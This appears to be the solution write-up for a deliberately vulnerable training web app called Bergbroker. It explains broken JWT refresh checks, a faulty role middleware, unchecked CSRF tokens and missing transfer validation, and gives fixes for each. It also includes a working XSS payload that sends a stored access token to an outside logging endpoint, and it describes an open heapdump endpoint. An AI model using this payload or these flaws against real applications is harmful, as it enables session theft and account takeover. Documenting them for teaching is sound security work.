# Bergbroker - Solution

## Access Control

### Vertical

Vertical Access Control limits functionality per user. This is utterly broken in several places:

The endpoint responsible for refreshing access tokens does not verify the refresh tokens signature, it merely decodes it:

```js
const valid = jwt.decode(refresh_token);

if (!valid) return res.sendStatus(401);
```

Instead, it should verify the signature (example code):

```js
let valid;
try {
    valid = jwt.verify(refresh_token, REFRESH_SECRET);
    
    if (!valid) throw new Error("No token");
} catch (e) {
    return res.sendStatus(401);
}
```

Additionally, the refresh token lasts a whole 30 seconds: (which should guide the student in the correct direction)

```js
const ACCESS_TOKEN_TTL = 60 * 60; // 60 minutes
const REFRESH_TOKEN_TTL = 30; // 30 days
```

This can be fixed by just lengthening the tokens TTL:

```js
const ACCESS_TOKEN_TTL = 60 * 60; // 60 minutes
const REFRESH_TOKEN_TTL = 30 * 24 * 60 * 60; // 30 days
```

### Horizontal

Horizontal Access Control limits functionality per role. This is also severely broken:

The middleware responsible for checking the users role uses `filter` instead of `find`, which just means that it will always return an array, even if the user is not found:

```js
export const requireRoles = (roles) => (req, res, next) => {
    if (!req.user.roles.filter((role) => roles.includes(role)))
        return res.sendStatus(403);

    next();
};
```

This can be fixed by using `find` instead:

```js
export const requireRoles = (roles) => (req, res, next) => {
    if (!req.user.roles.find((role) => roles.includes(role)))
        return res.sendStatus(403);

    next();
};
```

As an easter-egg, the `/actuator/heapdump` endpoint allows any user to create heap dumps. See [this talk](https://media.ccc.de/v/38c3-wir-wissen-wo-dein-auto-steht-volksdaten-von-volkswagen) why this is _incredibly_ secure and should be common practice.

## Cross-site scripting (XSS)

## Cross-site request forgery (CSRF)

The application issues valid CSRF tokens, but never actually checks them. This can be fixed by mapping the middleware to the correct path:

```js
brokerRouter.post("/csrf", (req, res, next) => {
```

should actually be:

```js
brokerRouter.post((req, res, next) => {

// or

brokerRouter.post("*", (req, res, next) => {
```

It should be noted that while this theoretically makes CSRF attacks possible, credentials are not stored in cookies, so the impact is limited.

## Validation Issue

Amount validation is missing from the `/transfer` endpoint, negative transfers are possible.

Fix:

```js
if (amount <= 0)
    return res.status(400).json({ error: "Invalid amount" });
```

## Injection / XSS

The following leads to XSS when clicking a transaction:
See also: [xss-image.rest](xss-image.rest)

```http
POST {{baseurl}}/broker/transfer
Authorization: Bearer {{access_token}}
Content-Type: application/json

{
    "peer": "admin",
    "amount": 1,
    "image": "javascript:fetch('<http://localhost:9090/log',{method:'POST',body:localStorage.getItem('token')}>);",
    "csrf": "{{csrfRequest.response.body.$.csrf}}"
}
```

Without using this javascript: url-pattern, an attacker can still de-anonymize our users by using external urls.

## Client issues

When manually editing the localStorage to obtain the "admin" role, the user can access the `/admin/users` page.
On this page, the user can see all users and their roles.
When the access control vulnerability is fixed, the user is rewarded with the password of the "john" user.
